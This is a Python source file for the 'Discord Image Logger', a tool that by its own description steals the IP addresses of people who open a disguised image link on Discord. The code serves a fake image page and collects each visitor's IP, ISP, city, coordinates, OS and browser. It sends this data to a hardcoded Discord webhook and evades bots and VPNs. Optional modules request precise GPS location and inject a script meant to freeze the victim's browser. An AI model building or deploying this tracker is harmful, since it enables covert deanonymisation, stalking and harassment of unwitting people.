# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1158481206984319016/8tPw5_o3I3lG5-V6H7zJ0do6X7AGecwhWrBF4uxh3buavJszkLg9IMqEU3k-new-4D9O",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
